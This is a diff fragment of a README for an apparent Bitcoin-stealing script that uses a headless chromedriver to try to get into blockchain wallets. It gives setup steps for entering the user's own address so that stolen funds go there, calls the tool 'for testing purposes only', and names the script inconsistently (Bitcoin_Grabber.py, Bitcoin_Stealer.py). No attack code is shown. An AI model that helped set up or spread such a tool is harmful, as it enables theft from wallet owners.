@@ -7,7 +7,7 @@ The script opens a headless chromedriver and tries getting into blockchain portf
 This is just for testing purposes only.
 
 How to use:
-1. Open BitcoinGrabber.py with notepad.
+1. Open Bitcoin_Grabber.py with notepad.
 2. At the very beginning of the script you will find the line beginning with BitcoinAddress = "Your Bitcoin Address here!"
 3. Replace 'Your Bitcoin Address here!' with your own Blockchain Bitcoin Address
 4. Save Bitcoin_Stealer.py and close the the file.
